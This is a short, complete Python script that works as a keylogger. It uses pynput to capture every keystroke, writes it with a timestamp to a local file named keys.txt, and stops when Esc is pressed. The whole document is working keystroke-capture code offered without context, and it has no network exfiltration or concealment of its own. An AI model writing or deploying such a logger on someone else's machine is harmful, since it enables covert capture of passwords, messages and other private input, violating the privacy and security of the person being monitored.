#!/usr/bin/python3

import pynput.keyboard
import datetime

time = datetime.datetime.isoformat(datetime.datetime.now(), sep=' ')
new_entry = f'\n===== {time} =====\n'

keyMap = [
('Key.space', ' '),
('Key.enter', '\n'),
        ]


def on_press(key):
    if key == pynput.keyboard.Key.esc:
        return False

    if isinstance(key, pynput.keyboard.Key): #special char(enter, space...)
        for keyValue, printValue in keyMap:
            if keyValue == str(key):
                keyFile.write(printValue)
                break
    else:
        keyFile.write(key.char)


try:
    with open('keys.txt', 'a') as keyFile:
        keyFile.write(new_entry)

        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()
        
        keyFile.write('\n')
except:
    pass
